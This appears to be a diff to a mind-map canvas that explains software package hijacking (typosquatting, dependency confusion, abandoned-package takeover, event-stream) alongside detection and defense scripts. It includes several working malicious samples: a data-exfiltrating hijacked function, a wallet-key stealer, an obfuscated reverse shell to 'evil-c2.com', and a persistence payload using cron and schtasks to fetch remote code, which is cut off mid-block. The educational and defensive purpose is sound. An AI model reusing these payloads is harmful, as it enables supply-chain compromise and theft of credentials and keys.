+      "text": "**Example Process (PyPI):**\n\n```python\n# Technical process for PyPI abandoned package takeover:\n# 1. Identify abandoned package (no updates for >12 months)\n# 2. File request at https://pypi.org/help/#project-name\n# 3. Wait for administrator approval (~2-4 weeks)\n# 4. Gain publishing credentials\n# 5. Push malicious update with version increment\n\n# Original legitimate package (example.py)\ndef process_data(input_data):\n    return transform_data(input_data)\n\n# After hijacking - malicious version\ndef process_data(input_data):\n    result = transform_data(input_data)\n    \n    # Malicious addition - exfiltrates data\n    try:\n        import threading\n        threading.Thread(target=_send_data, args=(input_data,), daemon=True).start()\n    except:\n        pass\n    \n    return result\n\n# Covert exfiltration function\ndef _send_data(data):\n    try:\n        import urllib.request\n        import base64\n        import uuid\n        \n        encoded = base64.b64encode(str(data).encode()).decode()\n        session_id = str(uuid.uuid4())\n        urllib.request.urlopen(f\"https://analytics-cdn.example.com/pixel?sid={session_id}&d={encoded}\")\n    except:\n        pass\n```\n\n",
+      "type": "text",
+      "width": 1180,
+      "x": 2870,
+      "y": -9470
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "8b2ec1f86b96e367",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Abandoned Package Takeover",
+      "type": "text",
+      "width": 360,
+      "x": 2430,
+      "y": -8470
+    },
+    {
+      "color": "3",
+      "height": 300,
+      "id": "ca625fefae8cedb5",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Attackers identify valuable packages with lapsed ownership or maintenance\n- Request ownership transfer through repository processes (npm, PyPI, RubyGems)\n- Publish malicious versions after gaining publishing rights\n- Leverage pre-existing installation base and trust",
+      "type": "text",
+      "width": 580,
+      "x": 2870,
+      "y": -8410
+    },
+    {
+      "color": "3",
+      "height": 320,
+      "id": "8638215ee361a722",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Create packages with names similar to popular dependencies\n- Exploit typographical errors or visual similarity (e.g., \"lodahs\" vs \"lodash\")\n- Target autocomplete mistakes or copy-paste errors\n- Exploit project scaffolding where developers manually type package names",
+      "type": "text",
+      "width": 560,
+      "x": 2920,
+      "y": -8040
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "5a476aae3eee72f5",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "typosquatting / Name Confusion",
+      "type": "text",
+      "width": 420,
+      "x": 2400,
+      "y": -7910
+    },
+    {
+      "color": "3",
+      "height": 220,
+      "id": "b0b82454b897e68d",
+      "styleAttributes": {
+      },
+      "text": "**Detection Methods:**\n\n- Package name edit distance analysis\n- Unicode homoglyph detection\n- Package registration date vs. popularity anomalies\n- Behavioral analysis of post-install scripts",
+      "type": "text",
+      "width": 700,
+      "x": 2920,
+      "y": -7690
+    },
+    {
+      "color": "3",
+      "height": 260,
+      "id": "e5c156ffb4a1225f",
+      "styleAttributes": {
+        "textAlign": null
+      },
+      "text": "**Actual Attack Example (PyPI):**\n\n|Original Package|Typosquatted Version|\n|---|---|\n|requests|reqeusts|\n|urllib3|urlib3|\n|beautifulsoup4|beautifulsoup|",
+      "type": "text",
+      "width": 440,
+      "x": 2920,
+      "y": -7440
+    },
+    {
+      "color": "3",
+      "height": 340,
+      "id": "c7f8a2280caca86a",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Exploit default repository precedence in package managers\n- Register public packages with same names as private packages\n- Package manager pulls public (malicious) version instead of private one\n- Particularly effective with internal package names exposed in public code",
+      "type": "text",
+      "width": 580,
+      "x": 2920,
+      "y": -7110
+    },
+    {
+      "color": "3",
+      "height": 320,
+      "id": "b7c7fbdf01ef9d91",
+      "styleAttributes": {
+      },
+      "text": "**Technical Details:**\n\n- Most package managers check public repositories before private ones\n- Lack of namespace verification between public/private repositories\n- Risk factors include using internal package names in public repositories\n- Often exploitable through build scripts and CI/CD pipelines",
+      "type": "text",
+      "width": 600,
+      "x": 2920,
+      "y": -6750
+    },
+    {
+      "color": "3",
+      "height": 80,
+      "id": "02559c6714709bbd",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Namespace Confusion / Dependency Confusion",
+      "type": "text",
+      "width": 540,
+      "x": 2290,
+      "y": -6590
+    },
+    {
+      "color": "3",
+      "height": 400,
+      "id": "ebc8ab4429e3cdb5",
+      "styleAttributes": {
+      },
+      "text": "**Example of vulnerable package.json:**\n\n```json\n{\n  \"name\": \"company-project\",\n  \"dependencies\": {\n    \"react\": \"^17.0.2\",\n    \"company-internal-utils\": \"^2.1.0\",\n    \"company-logger\": \"^1.3.4\"\n  },\n  \"devDependencies\": {\n    \"jest\": \"^27.0.0\"\n  }\n}\n```",
+      "type": "text",
+      "width": 860,
+      "x": 2920,
+      "y": -6410
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "b25e36e253c0e6f5",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Technical Detection Methods",
+      "type": "text",
+      "width": 420,
+      "x": 5730,
+      "y": -7080
+    },
+    {
+      "color": "3",
+      "height": 1220,
+      "id": "cc0bad3bab7423db",
+      "styleAttributes": {
+      },
+      "text": "### Package Integrity Verification\n\n```javascript\n// Example script to verify package integrity with checksums\nconst fs = require('fs');\nconst crypto = require('crypto');\nconst childProcess = require('child_process');\n\n// Function to compute SHA-256 hash of a file\nfunction getFileHash(filePath) {\n  const fileContent = fs.readFileSync(filePath);\n  return crypto.createHash('sha256').update(fileContent).digest('hex');\n}\n\n// Get list of installed packages\nconst installedPackages = JSON.parse(\n  childProcess.execSync('npm list --json').toString()\n);\n\n// Check against known-good hashes\nconst knownHashes = require('./package-hashes.json');\nconst verificationResults = [];\n\nfunction verifyPackageIntegrity(pkgName, pkgPath) {\n  const mainFilePath = require.resolve(pkgName);\n  const actualHash = getFileHash(mainFilePath);\n  \n  if (knownHashes[pkgName] && knownHashes[pkgName] !== actualHash) {\n    verificationResults.push({\n      package: pkgName,\n      expected: knownHashes[pkgName],\n      actual: actualHash,\n      status: 'MISMATCH'\n    });\n  } else {\n    verificationResults.push({\n      package: pkgName,\n      actual: actualHash,\n      status: 'VERIFIED'\n    });\n  }\n}\n\n// Process all dependencies\nObject.keys(installedPackages.dependencies).forEach(pkg => {\n  verifyPackageIntegrity(pkg, installedPackages.dependencies[pkg].path);\n});\n\nconsole.log(JSON.stringify(verificationResults, null, 2));\n```",
+      "type": "text",
+      "width": 1140,
+      "x": 6250,
+      "y": -8110
+    },
+    {
+      "color": "3",
+      "height": 2560,
+      "id": "9694da59095c98a8",
+      "styleAttributes": {
+      },
+      "text": "### Behavioral Analysis for Detecting Hijacked Packages\n\n```python\n# Example behavioral analysis tool for Python packages\nimport inspect\nimport sys\nimport importlib\nimport os\nimport traceback\nimport socket\nimport ssl\nimport requests\nfrom pathlib import Path\n\n# High-risk behaviors to monitor\nSUSPICIOUS_BEHAVIORS = {\n    \"network_connections\": [],\n    \"file_operations\": [],\n    \"process_execution\": [],\n    \"environment_access\": []\n}\n\n# Monkey patch network operations\noriginal_socket_connect = socket.socket.connect\ndef patched_socket_connect(self, address):\n    SUSPICIOUS_BEHAVIORS[\"network_connections\"].append({\n        \"type\": \"socket\",\n        \"address\": address,\n        \"stack\": traceback.format_stack()\n    })\n    return original_socket_connect(self, address)\nsocket.socket.connect = patched_socket_connect\n\n# Monkey patch requests library\noriginal_requests_request = requests.Session.request\ndef patched_requests_request(self, method, url, *args, **kwargs):\n    SUSPICIOUS_BEHAVIORS[\"network_connections\"].append({\n        \"type\": \"http\",\n        \"method\": method,\n        \"url\": url,\n        \"stack\": traceback.format_stack()\n    })\n    return original_requests_request(self, method, url, *args, **kwargs)\nrequests.Session.request = patched_requests_request\n\n# Monkey patch file operations\noriginal_open = open\ndef patched_open(file, *args, **kwargs):\n    SUSPICIOUS_BEHAVIORS[\"file_operations\"].append({\n        \"operation\": \"open\",\n        \"file\": str(file),\n        \"mode\": args[0] if args else \"unknown\",\n        \"stack\": traceback.format_stack()\n    })\n    return original_open(file, *args, **kwargs)\nbuiltins.open = patched_open\n\n# Analyze package\ndef analyze_package(package_name):\n    print(f\"Analyzing package: {package_name}\")\n    \n    try:\n        # Import the package\n        package = importlib.import_module(package_name)\n        \n        # Monitor initial import behavior\n        print(f\"Initial behaviors on import:\")\n        print_suspicious_behaviors()\n        \n        # Reset behaviors for function testing\n        reset_behaviors()\n        \n        # Test package functions\n        print(f\"Testing package functions:\")\n        for name, obj in inspect.getmembers(package):\n            if inspect.isfunction(obj) and not name.startswith('_'):\n                try:\n                    print(f\"  Testing function: {name}\")\n                    # Call function with mock parameters\n                    obj(\"test_data\")\n                except Exception as e:\n                    print(f\"    Error calling {name}: {e}\")\n                \n                # Check for suspicious behaviors\n                print_suspicious_behaviors()\n                reset_behaviors()\n    \n    except Exception as e:\n        print(f\"Error analyzing package: {e}\")\n\ndef print_suspicious_behaviors():\n    for category, behaviors in SUSPICIOUS_BEHAVIORS.items():\n        if behaviors:\n            print(f\"  {category.upper()}:\")\n            for behavior in behaviors:\n                print(f\"    - {behavior}\")\n\ndef reset_behaviors():\n    for category in SUSPICIOUS_BEHAVIORS:\n        SUSPICIOUS_BEHAVIORS[category] = []\n\n# Example usage\nif __name__ == \"__main__\":\n    if len(sys.argv) > 1:\n        analyze_package(sys.argv[1])\n    else:\n        print(\"Please specify a package name\")\n```",
+      "type": "text",
+      "width": 1260,
+      "x": 6250,
+      "y": -6840
+    },
+    {
+      "color": "3",
+      "height": 340,
+      "id": "81dfcc3599ee2908",
+      "styleAttributes": {
+      },
+      "text": "**Vulnerability Pattern:**\n\n- Internal packages \"company-internal-utils\" and \"company-logger\" are not registered in the public npm registry\n- Attacker registers these package names in public registry\n- Future `npm install` may fetch attacker's packages if registry configurations change or CI/CD uses default settings",
+      "type": "text",
+      "width": 620,
+      "x": 2920,
+      "y": -5990
+    },
+    {
+      "color": "3",
+      "height": 1000,
+      "id": "6b9d9c73c55e9b96",
+      "styleAttributes": {
+      },
+      "text": "### 1. Private Package Repositories\n\n**Technical Implementation:**\n\n```yaml\n# Example Artifactory configuration for private npm repository\nversion: 1\nrepositories:\n  - name: npm-internal\n    type: npm\n    url: https://artifactory.company.com/artifactory/api/npm/npm-internal/\n    auth:\n      type: basic\n      username: \"${ARTIFACTORY_USER}\"\n      password: \"${ARTIFACTORY_PASSWORD}\"\n    \n  - name: npm-virtual\n    type: npm\n    url: https://artifactory.company.com/artifactory/api/npm/npm-virtual/\n    auth:\n      type: basic\n      username: \"${ARTIFACTORY_USER}\"\n      password: \"${ARTIFACTORY_PASSWORD}\"\n    \nnpmrc: |\n  registry=https://artifactory.company.com/artifactory/api/npm/npm-virtual/\n  @company:registry=https://artifactory.company.com/artifactory/api/npm/npm-internal/\n  always-auth=true\n  email=ci@company.com\n\nsecurity:\n  # Block publishing of packages that exist in upstream repos\n  prevent_package_substitution: true\n  # Scan packages for security vulnerabilities\n  scan_packages: true\n  # Prevent use of packages below specified quality gates\n  quality_gates:\n    vulnerability_severity_threshold: MEDIUM\n    license_compliance: true\n```",
+      "type": "text",
+      "width": 1020,
+      "x": 6060,
+      "y": -3790
+    },
+    {
+      "color": "6",
+      "height": 1260,
+      "id": "a477bb72c980133f",
+      "styleAttributes": {
+      },
+      "text": "**Malicious Code Analysis:**\n\n```javascript\n// Deobfuscated malicious flatmap-stream code\nmodule.exports = function flatmap(arr, iter) {\n  // Normal implementation of flatmap\n  return arr.reduce((acc, x) => acc.concat(iter(x)), []);\n};\n\n// Hidden malicious payload - triggered only for specific application\n;(function() {\n  try {\n    // Only execute in production mode\n    if (process.env.NODE_ENV !== 'production') return;\n    \n    // Check if target application is present (Copay Bitcoin wallet)\n    var pkg = require('./package.json');\n    if (pkg.name !== 'copay') return;\n    \n    // Malicious payload - deobfuscated\n    var buildSecret = function(username, password) {\n      return username + ':' + password;\n    };\n    \n    // Extract wallet private keys\n    var getPrivateKeys = function() {\n      try {\n        // Target specific application file paths\n        var appConfig = require('../../app-template/package.json');\n        var doSomething = require('crypto-js');\n        var bitcore = require('bitcore-wallet-client/lib/credentials.js');\n        \n        // Steal credentials\n        var keys = bitcore.prototype.exportKeys();\n        \n        // Encrypt and exfiltrate data\n        var encrypted = doSomething.AES.encrypt(JSON.stringify(keys), 'password123').toString();\n        var data = new Buffer(encrypted).toString('base64');\n        \n        // Send data to attacker server\n        require('https').get('https://copayapi.host/api/v2/bws/status?encoded=' + data);\n      } catch(e) {}\n    };\n    \n    // Execute after delay to avoid detection\n    setTimeout(getPrivateKeys, 5000);\n  } catch(e) {}\n})();\n```",
+      "type": "text",
+      "width": 1200,
+      "x": 4530,
+      "y": -3640
+    },
+    {
+      "color": "6",
+      "height": 440,
+      "id": "75da521d14dfa9a4",
+      "styleAttributes": {
+      },
+      "text": "### Event-Stream (NPM, 2018)\n\n**Attack Details:**\n\n- The original maintainer transferred ownership to a malicious actor\n- Attacker added a dependency on a new package called \"flatmap-stream\"\n- Flatmap-stream contained obfuscated code targeting Copay Bitcoin wallet\n- Attack specifically targeted one application while remaining dormant elsewhere\n- Accessed Bitcoin wallet private keys and transmitted them to a remote server",
+      "type": "text",
+      "width": 700,
+      "x": 3330,
+      "y": -3230
+    },
+    {
+      "color": "3",
+      "height": 260,
+      "id": "f6118e0d78fa2beb",
+      "styleAttributes": {
+      },
+      "text": "### 3. Subresource Integrity Checks\n\n```html\n<!-- Browser-level integrity verification -->\n<script \n  src=\"https://cdn.example.com/library.js\" \n  integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\" \n  crossorigin=\"anonymous\">\n</script>\n```",
+      "type": "text",
+      "width": 760,
+      "x": 6060,
+      "y": -2540
+    },
+    {
+      "color": "3",
+      "height": 4360,
+      "id": "c2cedfc4393c4439",
+      "styleAttributes": {
+      },
+      "text": "### 4. Automated Package Monitoring\n\n```python\n# Example of package supply chain monitoring in CI/CD pipeline\nimport json\nimport requests\nimport sys\nimport os\nimport hashlib\nfrom datetime import datetime, timedelta\n\n# Configuration\nPACKAGE_MANAGERS = {\n    \"npm\": {\n        \"registry_api\": \"https://registry.npmjs.org/\",\n        \"packages\": [\"express\", \"lodash\", \"react\", \"vue\"]\n    },\n    \"pypi\": {\n        \"registry_api\": \"https://pypi.org/pypi/\",\n        \"packages\": [\"requests\", \"flask\", \"django\", \"numpy\"]\n    }\n}\n\nALERT_THRESHOLD = timedelta(days=1)  # Alert on packages updated in last 24h\nPACKAGE_HISTORY_DB = \"package_history.json\"\n\n# Load package history\ntry:\n    with open(PACKAGE_HISTORY_DB) as f:\n        package_history = json.load(f)\nexcept FileNotFoundError:\n    package_history = {}\n\ndef get_package_info(manager, package_name):\n    \"\"\"Fetch package information from registry\"\"\"\n    registry = PACKAGE_MANAGERS[manager][\"registry_api\"]\n    \n    if manager == \"npm\":\n        url = f\"{registry}{package_name}\"\n    elif manager == \"pypi\":\n        url = f\"{registry}{package_name}/json\"\n    else:\n        raise ValueError(f\"Unsupported package manager: {manager}\")\n    \n    response = requests.get(url)\n    return response.json()\n\ndef analyze_package_changes(manager, package_name, info):\n    \"\"\"Analyze changes in package and detect suspicious updates\"\"\"\n    key = f\"{manager}:{package_name}\"\n    now = datetime.utcnow().isoformat()\n    \n    if manager == \"npm\":\n        latest_version = info[\"dist-tags\"][\"latest\"]\n        latest_info = info[\"versions\"][latest_version]\n        maintainers = info.get(\"maintainers\", [])\n        published_at = info[\"time\"][latest_version]\n        shasum = latest_info[\"dist\"][\"shasum\"]\n        tarball_url = latest_info[\"dist\"][\"tarball\"]\n    elif manager == \"pypi\":\n        latest_version = info[\"info\"][\"version\"]\n        releases = info[\"releases\"][latest_version]\n        maintainers = [info[\"info\"][\"author\"]]\n        published_at = releases[0][\"upload_time\"] if releases else \"unknown\"\n        shasum = releases[0][\"digests\"][\"sha256\"] if releases else \"unknown\"\n        tarball_url = releases[0][\"url\"] if releases else \"unknown\"\n    \n    # Check if we've seen this package before\n    if key in package_history:\n        prev = package_history[key]\n        alerts = []\n        \n        # Check for version changes\n        if prev[\"latest_version\"] != latest_version:\n            alerts.append(f\"Version changed: {prev['latest_version']} -> {latest_version}\")\n        \n        # Check for maintainer changes\n        prev_maintainers = set(m[\"name\"] if isinstance(m, dict) else m for m in prev[\"maintainers\"])\n        current_maintainers = set(m[\"name\"] if isinstance(m, dict) else m for m in maintainers)\n        \n        if prev_maintainers != current_maintainers:\n            added = current_maintainers - prev_maintainers\n            removed = prev_maintainers - current_maintainers\n            \n            if added:\n                alerts.append(f\"New maintainers added: {', '.join(added)}\")\n            if removed:\n                alerts.append(f\"Maintainers removed: {', '.join(removed)}\")\n        \n        # Check for hash changes (same version but different hash)\n        if prev[\"latest_version\"] == latest_version and prev[\"shasum\"] != shasum:\n            alerts.append(f\"CRITICAL: Hash changed for same version number! Old: {prev['shasum']} New: {shasum}\")\n        \n        # Check for recent updates\n        if manager == \"pypi\":\n            update_time = datetime.fromisoformat(published_at.replace(\"Z\", \"+00:00\"))\n        else:\n            update_time = datetime.fromisoformat(published_at.replace(\"Z\", \"+00:00\"))\n            \n        if datetime.utcnow() - update_time < ALERT_THRESHOLD:\n            alerts.append(f\"Recent update detected: {published_at}\")\n        \n        # Return results\n        if alerts:\n            return {\n                \"package\": package_name,\n                \"manager\": manager,\n                \"alerts\": alerts,\n                \"current\": {\n                    \"version\": latest_version,\n                    \"shasum\": shasum,\n                    \"tarball\": tarball_url,\n                    \"published_at\": published_at,\n                    \"maintainers\": list(current_maintainers)\n                },\n                \"previous\": {\n                    \"version\": prev[\"latest_version\"],\n                    \"shasum\": prev[\"shasum\"],\n                    \"published_at\": prev[\"published_at\"],\n                    \"maintainers\": list(prev_maintainers)\n                }\n            }\n    \n    # Update history\n    package_history[key] = {\n        \"latest_version\": latest_version,\n        \"shasum\": shasum,\n        \"tarball_url\": tarball_url,\n        \"published_at\": published_at,\n        \"maintainers\": maintainers,\n        \"last_checked\": now\n    }\n    \n    # No alerts for first-time check\n    return None\n\ndef main():\n    alerts = []\n    \n    # Check each package in each manager\n    for manager, config in PACKAGE_MANAGERS.items():\n        for package in config[\"packages\"]:\n            try:\n                print(f\"Checking {manager}:{package}...\")\n                info = get_package_info(manager, package)\n                result = analyze_package_changes(manager, package, info)\n                \n                if result:\n                    alerts.append(result)\n                    print(f\"⚠️ ALERT: {package} has suspicious changes!\")\n                else:\n                    print(f\"✅ {package} verified\")\n                    \n            except Exception as e:\n                print(f\"Error checking {package}: {e}\")\n    \n    # Save updated package history\n    with open(PACKAGE_HISTORY_DB, \"w\") as f:\n        json.dump(package_history, f, indent=2)\n    \n    # Output alerts\n    if alerts:\n        print(\"\\n⚠️ SECURITY ALERTS DETECTED ⚠️\")\n        for alert in alerts:\n            print(f\"\\nPackage: {alert['manager']}:{alert['package']}\")\n            for a in alert['alerts']:\n                print(f\"  - {a}\")\n            \n            # Output detailed changes\n            if 'current' in alert and 'previous' in alert:\n                print(\"  Details:\")\n                print(f\"    Version: {alert['previous']['version']} -> {alert['current']['version']}\")\n                print(f\"    Published: {alert['previous']['published_at']} -> {alert['current']['published_at']}\")\n                \n        # Exit with error code for CI/CD pipelines to detect\n        sys.exit(1)\n    else:\n        print(\"\\nAll packages verified successfully!\")\n        sys.exit(0)\n\nif __name__ == \"__main__\":\n    main()\n```",
+      "type": "text",
+      "width": 1400,
+      "x": 6060,
+      "y": -2220
+    },
+    {
+      "color": "3",
+      "height": 80,
+      "id": "0a41b94317cf1795",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "## Advanced Defensive Strategies",
+      "type": "text",
+      "width": 450,
+      "x": 5460,
+      "y": -2060
+    },
+    {
+      "color": "3",
+      "height": 840,
+      "id": "03bac22cfe3d50be",
+      "styleAttributes": {
+      },
+      "text": "**Example of Obfuscated Payload (Simplified from actual attack):**\n\n```python\n# Obfuscated malicious code in PyPI package\nimport base64, codecs\n_ = lambda x: base64.b64decode(codecs.decode(x, 'rot13'))\n\n# Looks like innocent configuration\nconfig = 'MQyvMJkfVQyvMJkfVP1uL2uyL2gcozpvBj1vAwNvBj1vAwZvBj1uL2uyL2gcozpvBj===='\n\n# Actually evaluates to malicious code when decoded\nexec(_.decode('utf-8'))\n\n# When decoded becomes:\n\"\"\"\nimport os, sys, socket\ndef _connect():\n    s = socket.socket()\n    s.connect(('evil-c2.com', 443))\n    while True:\n        cmd = s.recv(1024).decode()\n        if cmd.lower() == 'exit': break\n        try:\n            output = os.popen(cmd).read()\n            s.send(output.encode())\n        except:\n            s.send(b'Command execution failed')\n            \n# Only execute in certain environments\nif os.getuid() != 0 and not os.path.exists('/proc/vz'):\n    import threading\n    threading.Thread(target=_connect, daemon=True).start()\n\"\"\"\n```",
+      "type": "text",
+      "width": 1000,
+      "x": 4480,
+      "y": -1240
+    },
+    {
+      "color": "3",
+      "height": 460,
+      "id": "a3ebd2380a7dcb17",
+      "styleAttributes": {
+      },
+      "text": "### Python Package Index (PyPI) Attacks\n\n**Persistent Techniques:**\n\n1. **Repository Pattern Abuse**: Attackers analyze common repository patterns to identify high-value targets\n2. **Development Toolchain Targeting**: Focusing on packages used in CI/CD pipelines\n3. **Delayed Execution**: Malicious code waits for specific conditions before executing\n4. **Legitimate Functionality**: Maintaining legitimate package functionality while adding backdoors",
+      "type": "text",
+      "width": 600,
+      "x": 3680,
+      "y": -1000
+    },
+    {
+      "color": "3",
+      "height": 340,
+      "id": "f25eb50a2bcec21c",
+      "styleAttributes": {
+      },
+      "text": "**Technical Mechanism:**\n\n- Direct targeting of package maintainer credentials\n- Methods include phishing, password reuse, token theft, etc.\n- Push malicious updates under trusted maintainer identity\n- Particularly effective for packages with large installation bases",
+      "type": "text",
+      "width": 600,
+      "x": 2930,
+      "y": -5610
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "d0b1876b7c7175d8",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Maintainer Account Compromise",
+      "type": "text",
+      "width": 360,
+      "x": 2330,
+      "y": -5270
+    },
+    {
+      "color": "3",
+      "height": 260,
+      "id": "ba8616cc7c608024",
+      "styleAttributes": {
+      },
+      "text": "**Security Indicators:**\n\n- Unusual commit patterns or code contributions\n- Off-cycle or emergency releases\n- Changes to package distribution scripts\n- New dependencies or build requirements\n- Modified post-install behaviors",
+      "type": "text",
+      "width": 580,
+      "x": 2930,
+      "y": -5210
+    },
+    {
+      "color": "6",
+      "height": 80,
+      "id": "e7d73939adcc6245",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "## Major Package Hijacking Incidents",
+      "type": "text",
+      "width": 440,
+      "x": 2370,
+      "y": -2450
+    },
+    {
+      "color": "3",
+      "height": 540,
+      "id": "b9a990501b1f8036",
+      "styleAttributes": {
+      },
+      "text": "## Package Hijacking Defense Summary\n\n|Defense Strategy|Technical Implementation|Effectiveness|\n|---|---|---|\n|**Version Pinning**|Use exact versions in package files with integrity hashes|High - Prevents automatic updates to compromised versions|\n|**Private Repositories**|Configure proxies with security scanning and caching|High - Controls upstream dependency sources|\n|**SCA Tools**|Deploy automated scanning in CI/CD pipelines|Medium - Detects known issues but not zero-days|\n|**Behavioral Analysis**|Runtime monitoring of package behaviors|High - Can detect previously unknown malicious behaviors|\n|**Multi-Factor Auth**|Require MFA for package registry accounts|Medium - Reduces account takeover risk but doesn't help with typosquatting|\n|**Dependency Confusion Protection**|Namespace reservation and scope protection|High - Specifically targets dependency confusion attacks|",
+      "type": "text",
+      "width": 820,
+      "x": 690,
+      "y": -3040
+    },
+    {
+      "color": "3",
+      "height": 200,
+      "id": "8214838797839f9e",
+      "styleAttributes": {
+      },
+      "text": "Package hijacking refers to a set of techniques where attackers gain control of packages in public repositories to distribute malicious code to downstream consumers.",
+      "type": "text",
+      "width": 360,
+      "x": 1070,
+      "y": -1980
+    },
+    {
+      "color": "3",
+      "height": 60,
+      "id": "60baf306a69c06ef",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "Package Hijacking",
+      "type": "text",
+      "width": 260,
+      "x": 1120,
+      "y": -2150
+    },
+    {
+      "height": 60,
+      "id": "1ed88bacdcb80115",
+      "styleAttributes": {
+        "textAlign": "center"
+      },
+      "text": "### 3. Living-off-the-land Techniques",
+      "type": "text",
+      "width": 420,
+      "x": -3000,
+      "y": 2810
+    },
+    {
+      "height": 4100,
+      "id": "94e0bc03b2bf4e64",
+      "styleAttributes": {
+      },
+      "text": "**Technical Implementation:**\n\n```python\n# Python package injection using living-off-the-land techniques\n# These techniques use legitimate system tools to avoid detection\n\nimport os\nimport sys\nimport platform\nimport subprocess\nfrom datetime import datetime\nimport json\nimport base64\nimport urllib.request\nimport tempfile\nimport atexit\nimport random\nimport time\n\nclass SystemProfiler:\n    \"\"\"Legitimate-looking system profiling utility\"\"\"\n    \n    def __init__(self):\n        self.system_info = self._collect_system_info()\n        \n    def _collect_system_info(self):\n        \"\"\"Collect system information for 'compatibility checks'\"\"\"\n        info = {\n            \"platform\": platform.system(),\n            \"release\": platform.release(),\n            \"version\": platform.version(),\n            \"architecture\": platform.machine(),\n            \"processor\": platform.processor(),\n            \"python_version\": sys.version,\n            \"timestamp\": datetime.now().isoformat()\n        }\n        \n        # This appears to be compatibility checking\n        # but actually identifies valuable targets\n        if os.name == 'posix':\n            # Check for cloud environments\n            info[\"aws\"] = self._check_cloud_env(\"aws\")\n            info[\"azure\"] = self._check_cloud_env(\"azure\")\n            info[\"gcp\"] = self._check_cloud_env(\"gcp\")\n            \n            # Look for container environments\n            info[\"docker\"] = os.path.exists(\"/.dockerenv\")\n            info[\"kubernetes\"] = \"KUBERNETES_SERVICE_HOST\" in os.environ\n            \n            # Check for valuable files\n            info[\"has_ssh_keys\"] = os.path.exists(os.path.expanduser(\"~/.ssh/id_rsa\"))\n        \n        return info\n    \n    def _check_cloud_env(self, provider):\n        \"\"\"Check if running in specific cloud environment\"\"\"\n        indicators = {\n            \"aws\": [\"/sys/hypervisor/uuid\", \"EC2_\", \"AWS_\"],\n            \"azure\": [\"WALinuxAgent\", \"AZURE_\"],\n            \"gcp\": [\"Compute Engine\", \"GOOGLE_CLOUD_\"]\n        }\n        \n        # Check for files indicating cloud provider\n        for path in [\"/sys/class/dmi/id/product_name\", \"/sys/class/dmi/id/sys_vendor\"]:\n            if os.path.exists(path):\n                try:\n                    with open(path, 'r') as f:\n                        content = f.read().lower()\n                        if provider in content:\n                            return True\n                except:\n                    pass\n        \n        # Check for environment variables\n        for env_prefix in indicators[provider]:\n            for env_var in os.environ:\n                if env_var.startswith(env_prefix):\n                    return True\n        \n        return False\n    \n    def report(self):\n        \"\"\"Generate compatibility report - a legitimate-looking function\"\"\"\n        print(f\"System: {self.system_info['platform']} {self.system_info['release']}\")\n        print(f\"Architecture: {self.system_info['architecture']}\")\n        print(f\"Python version: {sys.version.split()[0]}\")\n        \n        # Appears to be checking legitimate compatibility issues\n        if self.system_info['platform'] == 'Windows':\n            if int(platform.version().split('.')[0]) < 10:\n                print(\"Warning: Some features may not work on Windows versions below 10\")\n                \n        return self.system_info\n\n\n# The malicious part is hidden in a background optimization function\ndef _optimize_resource_usage():\n    \"\"\"Appears to be an innocent optimization function\"\"\"\n    # But actually contains the malicious payload\n    try:\n        profiler = SystemProfiler()\n        system_data = profiler.report()\n        \n        # Only proceed if high-value target identified\n        is_valuable_target = (\n            system_data.get(\"aws\", False) or \n            system_data.get(\"azure\", False) or\n            system_data.get(\"gcp\", False) or\n            system_data.get(\"kubernetes\", False) or\n            system_data.get(\"has_ssh_keys\", False)\n        )\n        \n        if is_valuable_target:\n            # Use living-off-the-land techniques for malicious purposes\n            \n            # 1. Create a hidden file using legitimate tempfile module\n            temp_dir = tempfile.gettempdir()\n            profile_file = os.path.join(temp_dir, f\".{random.randrange(100000,999999)}.json\")\n            \n            # 2. Encode system data to look like cache file\n            with open(profile_file, 'w') as f:\n                json.dump(system_data, f)\n            \n            # 3. Use built-in libraries to exfiltrate data\n            encoded_data = base64.b64encode(json.dumps(system_data).encode()).decode()\n            urllib.request.urlopen(\n                f\"https://api.package-stats.io/v1/metrics?d={encoded_data}\"\n            )\n            \n            # 4. Schedule cleanup to remove evidence\n            atexit.register(lambda: os.path.exists(profile_file) and os.remove(profile_file))\n            \n            # 5. Use platform-specific LOL techniques to establish persistence\n            if system_data[\"platform\"] == \"Linux\":\n                # Find a world-writable cron directory\n                cron_dirs = [\"/etc/cron.d\", \"/etc/cron.hourly\", \"/var/spool/cron/crontabs\"]\n                for cdir in cron_dirs:\n                    if os.path.exists(cdir) and os.access(cdir, os.W_OK):\n                        cron_file = os.path.join(cdir, \".system-update\")\n                        try:\n                            with open(cron_file, 'w') as f:\n                                f.write(f\"* * * * * {sys.executable} -c 'import urllib.request as r; import os; os.system(r.urlopen(\\\"https://api.package-stats.io/updates/unix.py\\\").read().decode())'\")\n                            # Make file executable but hidden\n                            os.chmod(cron_file, 0o755)\n                            break\n                        except:\n                            pass\n                            \n            elif system_data[\"platform\"] == \"Windows\":\n                # Use Windows Task Scheduler\n                try:\n                    # Create a .bat file to execute the payload\n                    bat_path = os.path.join(os.environ[\"TEMP\"], \"winupdate.bat\")\n                    with open(bat_path, 'w') as f:\n                        f.write(f\"@echo off\\n{sys.executable} -c \\\"import urllib.request as r; exec(r.urlopen('https://api.package-stats.io/updates/win.py').read().decode())\\\"\")\n                    \n                    # Use schtasks to create a scheduled task\n                    subprocess.Popen(\n                        f\"schtasks /create /tn \\\"WindowsUpdater\\\" /tr \\\"{bat_path}\\\" /sc hourly /ru SYSTEM /f\",\n                        shell=True, \n                        stdout=subprocess.PIPE,\n                        stderr=subprocess.PIPE\n                    )\n                except:\n                    pass\n    except:\n        